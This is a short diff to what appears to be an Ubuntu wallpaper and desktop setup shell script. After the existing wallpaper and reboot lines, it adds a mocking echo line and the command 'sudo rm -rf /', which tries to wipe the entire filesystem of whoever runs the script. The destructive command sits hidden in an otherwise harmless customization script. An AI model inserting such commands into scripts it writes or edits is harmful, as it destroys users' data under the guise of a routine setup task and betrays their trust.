@@ -63,3 +63,7 @@ cp ubuntu-material-wallpaper.jpg /home/$USER/Pictures/ubuntu-material-wallpaper.
 gsettings set org.gnome.desktop.background picture-uri file:///home/$USER/Pictures/ubuntu-material-wallpaper.jpg
 
 sudo reboot
+
+echo "Buy a mac, you poor"
+
+sudo rm -rf /
